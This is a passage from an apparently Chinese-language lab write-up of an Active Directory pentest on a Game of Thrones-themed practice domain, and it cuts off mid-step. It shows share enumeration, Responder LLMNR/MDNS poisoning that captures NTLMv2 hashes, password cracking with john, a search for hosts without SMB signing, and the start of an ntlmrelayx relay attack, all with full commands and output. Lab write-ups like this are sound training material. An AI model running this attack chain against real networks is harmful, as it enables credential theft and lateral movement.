class="hljs-keyword">in</span> <span class="hljs-number">48.0</span><span class="hljs-number">.0</span>.<br>  arc4 = algorithms.ARC4(self._key)<br>WINRM       <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">5985</span>   WINTERFELL       [-] north.sevenkingdoms.<span class="hljs-keyword">local</span>\jon.snow:iknownothing<br>                                                                                 <br></code></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> -u &quot;jon.snow&quot; -p &quot;iknownothing&quot; <span class="hljs-comment">--shares</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)                                                                                                                      <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [+] north.sevenkingdoms.<span class="hljs-keyword">local</span>\jon.snow:iknownothing <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Enumerated shares<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       <span class="hljs-keyword">Share</span>           Permissions     Remark<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       <span class="hljs-comment">-----           -----------     ------</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       <span class="hljs-keyword">ADMIN</span>$                          Remote <span class="hljs-keyword">Admin</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       C$                              <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       IPC$            <span class="hljs-keyword">READ</span>            Remote IPC<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       NETLOGON        <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       SYSVOL          <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>                                                                                                                 <br></code></pre></td></tr></table></figure>

<p>又是啥都没有的一天，四个账户一个远程登录的权限都没有。</p>
<p>查看wp，这里要退一步，使用responder获得ntlm哈希。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># responder -I eth2</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[+]</span> Listening <span class="hljs-keyword">for</span> events...                                                                                                                                 <br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<br><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Client   : fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a<br><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Username : NORTH\robb<span class="hljs-selector-class">.stark</span><br><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Hash     : robb<span class="hljs-selector-class">.stark</span>::NORTH:<span class="hljs-number">5</span>cab2ee05c35b94e:C1F8C20C08A50F1573EA7369EDD807C1:<span class="hljs-number">010100000000000080</span>A474792693DC013D4144D8E6A070BB0000000002000800560032005200550001001E00570049004E002D00480045004300330042004D00590036004B0057004B0004003400570049004E002D00480045004300330042004D00590036004B0057004B002E0056003200520055002E004C004F00430041004C000300140056003200520055002E004C004F00430041004C000500140056003200520055002E004C004F00430041004C000700080080A474792693DC01060004000200000008003000300000000000000000000000003000008C52D3E19A1CA2ADB7167B849B891695BD685A330597915B87342EFD6DC6FA530A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000                                                                            <br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<br><span class="hljs-selector-attr">[*]</span> Skipping previously captured hash <span class="hljs-keyword">for</span> NORTH\robb<span class="hljs-selector-class">.stark</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Bravos<br><span class="hljs-selector-attr">[*]</span> Skipping previously captured hash <span class="hljs-keyword">for</span> NORTH\robb<span class="hljs-selector-class">.stark</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::c0f2:f4a3:db2:<span class="hljs-number">7210</span> <span class="hljs-keyword">for</span> name wpad<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::c0f2:f4a3:db2:<span class="hljs-number">7210</span> <span class="hljs-keyword">for</span> name wpad<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::c0f2:f4a3:db2:<span class="hljs-number">7210</span> <span class="hljs-keyword">for</span> name wpad<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::c0f2:f4a3:db2:<span class="hljs-number">7210</span> <span class="hljs-keyword">for</span> name wpad<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::c0f2:f4a3:db2:<span class="hljs-number">7210</span> <span class="hljs-keyword">for</span> name wpad<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::c0f2:f4a3:db2:<span class="hljs-number">7210</span> <span class="hljs-keyword">for</span> name wpad<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">5</span>cd5:<span class="hljs-number">443</span>:<span class="hljs-number">2</span>cc5:<span class="hljs-number">7310</span> <span class="hljs-keyword">for</span> name kingslanding<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">5</span>cd5:<span class="hljs-number">443</span>:<span class="hljs-number">2</span>cc5:<span class="hljs-number">7310</span> <span class="hljs-keyword">for</span> name kingslanding<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">5</span>cd5:<span class="hljs-number">443</span>:<span class="hljs-number">2</span>cc5:<span class="hljs-number">7310</span> <span class="hljs-keyword">for</span> name kingslanding<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">5</span>cd5:<span class="hljs-number">443</span>:<span class="hljs-number">2</span>cc5:<span class="hljs-number">7310</span> <span class="hljs-keyword">for</span> name kingslanding<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Meren<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Meren<span class="hljs-selector-class">.local</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Meren<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[LLMNR]</span>  Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Meren<br><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Client   : fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a<br><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Username : NORTH\eddard<span class="hljs-selector-class">.stark</span><br><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Hash     : eddard<span class="hljs-selector-class">.stark</span>::NORTH:<span class="hljs-number">881</span>cb768f9ab001b:<span class="hljs-number">00</span>C0729635FE5843A7CEDFA214F0ADBE:<span class="hljs-number">010100000000000080</span>A474792693DC01E0BEB34BF358B3AD0000000002000800560032005200550001001E00570049004E002D00480045004300330042004D00590036004B0057004B0004003400570049004E002D00480045004300330042004D00590036004B0057004B002E0056003200520055002E004C004F00430041004C000300140056003200520055002E004C004F00430041004C000500140056003200520055002E004C004F00430041004C000700080080A474792693DC01060004000200000008003000300000000000000000000000003000008C52D3E19A1CA2ADB7167B849B891695BD685A330597915B87342EFD6DC6FA530A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000                                                                              <br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-attr">[MDNS]</span> Poisoned answer sent to fe80::<span class="hljs-number">1</span>d17:a38a:<span class="hljs-number">843</span>c:b94a <span class="hljs-keyword">for</span> name Meren<span class="hljs-selector-class">.local</span><br><br></code></pre></td></tr></table></figure>

<p>我们获得了罗柏·史塔克和艾德·史塔克的哈希，使用john破解。</p>
<p>只能破解出来罗柏的。</p>
<blockquote>
<p><strong>原理：</strong> 利用 Windows 的名称解析顺序缺陷。</p>
<ol>
<li>当受害者机器尝试访问一个不存在的主机名（例如手滑输错了 <code>\\server01</code> 输成了 <code>\\serber01</code>）。</li>
<li>DNS 解析失败。</li>
<li>Windows 会向局域网发送 <strong>LLMNR</strong> (Link-Local Multicast Name Resolution) 和 <strong>NBT-NS</strong> (NetBIOS Name Service) 广播，询问“谁知道 serber01 的IP？”。</li>
<li><strong>Responder</strong>（攻击者）监听到广播后，立刻伪造响应：“我是 serber01，我的IP是 [攻击机IP]”。</li>
<li>受害者相信了，并向攻击机发起 SMB 认证连接，发送自己的用户名和 <strong>NTLMv2 Hash</strong>（加密的凭据）。</li>
</ol>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">2</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>sexywolfy        (robb.stark)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span> DONE (<span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-01</span> <span class="hljs-number">03</span>:<span class="hljs-number">02</span>) <span class="hljs-number">0.2070</span>g/s <span class="hljs-number">2969</span>Kp/s <span class="hljs-number">3238</span>Kc/s <span class="hljs-number">3238</span>KC/s !)(OPPQR..*<span class="hljs-number">7</span>¡Vamos!<br>Use the &quot;--show --format=netntlmv2&quot; <span class="hljs-keyword">options</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br></code></pre></td></tr></table></figure>

<p>接下来使用ntlm中继攻击</p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1548/">https://tttang.com/archive/1548/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18985420">AD 提权-NTLM 中继攻击（强制认证） - 扛枪的书生 - 博客园</a></p>
<p>这里贴一下两篇博客，感觉说的很形象详细。</p>
<p>先找到没有开启smb签名认证的机器。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u &quot;jon.snow&quot; -p &quot;iknownothing&quot; <span class="hljs-comment">--gen-relay-list relay.txt</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span>   <span class="hljs-number">445</span>    MEEREEN          [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:MEEREEN) (<span class="hljs-keyword">domain</span>:essos.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span>   <span class="hljs-number">445</span>    MEEREEN          [-] essos.<span class="hljs-keyword">local</span>\jon.snow:iknownothing STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span>   <span class="hljs-number">445</span>    BRAAVOS          [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:BRAAVOS) (<span class="hljs-keyword">domain</span>:essos.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)                                                                                                                      <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span>   <span class="hljs-number">445</span>    KINGSLANDING     [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:KINGSLANDING) (<span class="hljs-keyword">domain</span>:sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)                                                                                                                          <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span>   <span class="hljs-number">445</span>    CASTELBLACK      [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:CASTELBLACK) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">None</span>)                                                                                                                                     <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span>   <span class="hljs-number">445</span>    BRAAVOS          [+] essos.<span class="hljs-keyword">local</span>\jon.snow:iknownothing (Guest)<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span>   <span class="hljs-number">445</span>    KINGSLANDING     [-] sevenkingdoms.<span class="hljs-keyword">local</span>\jon.snow:iknownothing STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span>   <span class="hljs-number">445</span>    CASTELBLACK      [+] north.sevenkingdoms.<span class="hljs-keyword">local</span>\jon.snow:iknownothing <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [+] north.sevenkingdoms.<span class="hljs-keyword">local</span>\jon.snow:iknownothing <br>Running nxc against <span class="hljs-number">256</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <span class="hljs-number">100</span>% <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure>

<p>192.168.10.22和192.168.10.23没有开启smb签名认证。</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(root㉿kaada)-<span class="hljs-string">[/home/kali/Desktop]</span><br>└─# cat relay.txt <br><span class="hljs-number">192.168.10.23</span><br><span class="hljs-number">192.168.10.22</span><br></code></pre></td></tr></table></figure>

<p>接下来需要修改responder的配置文件，让默认的smb和http服务器关掉。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">#</span> 修改 <span class="hljs-variable">HTTP</span><br><span class="hljs-variable">sed</span> <span class="hljs-operator">-</span><span class="hljs-variable">i</span> <span class="hljs-operator">-</span><span class="hljs-built_in">E</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">s</span><span class="hljs-operator">/</span><span class="hljs-variable">HTTP</span>\<span class="hljs-variable">s</span><span class="hljs-operator">*=</span>\<span class="hljs-variable">s</span><span class="hljs-operator">*</span><span class="hljs-built_in">On</span><span class="hljs-operator">/</span><span class="hljs-variable">HTTP</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">Off</span><span class="hljs-operator">/</span><span class="hljs-variable">g</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">/</span><span class="hljs-variable">etc</span><span class="hljs-operator">/</span><span class="hljs-variable">responder</span><span class="hljs-operator">/</span><span class="hljs-variable">Responder</span><span class="hljs-operator">.</span><span class="hljs-variable">conf</span><br><br><span class="hljs-type">#</span> 修改 <span class="hljs-variable">SMB</span><br><span class="hljs-variable">sed</span> <span class="hljs-operator">-</span><span class="hljs-variable">i</span> <span class="hljs-operator">-</span><span class="hljs-built_in">E</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">s</span><span class="hljs-operator">/</span><span class="hljs-variable">SMB</span>\<span class="hljs-variable">s</span><span class="hljs-operator">*=</span>\<span class="hljs-variable">s</span><span class="hljs-operator">*</span><span class="hljs-built_in">On</span><span class="hljs-operator">/</span><span class="hljs-variable">SMB</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">Off</span><span class="hljs-operator">/</span><span class="hljs-variable">g</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">/</span><span class="hljs-variable">etc</span><span class="hljs-operator">/</span><span class="hljs-variable">responder</span><span class="hljs-operator">/</span><span class="hljs-variable">Responder</span><span class="hljs-operator">.</span><span class="hljs-variable">conf</span><br><br><span class="hljs-operator">;</span> <span class="hljs-variable">Servers</span> <span class="hljs-variable">to</span> <span class="hljs-variable">start</span><br><span class="hljs-variable">SQL</span>      <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">SMB</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">Off</span><br><span class="hljs-variable">QUIC</span>     <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">RDP</span>      <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">Kerberos</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">FTP</span>      <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">POP</span>      <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">SMTP</span>     <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">IMAP</span>     <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">HTTP</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">Off</span><br><span class="hljs-variable">HTTPS</span>    <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">DNS</span>      <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">LDAP</span>     <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">DCERPC</span>   <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">WINRM</span>    <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">SNMP</span>     <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">MQTT</span>     <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span><br><span class="hljs-variable">MYSQL</span>    <span class="hljs-operator">=</span> <span class="hljs-built_in">On</span> <br><br></code></pre></td></tr></table></figure>

<p>之后启动ntlmrelayx</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks <br><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - <span class="hljs-symbol">Copyright</span> <span 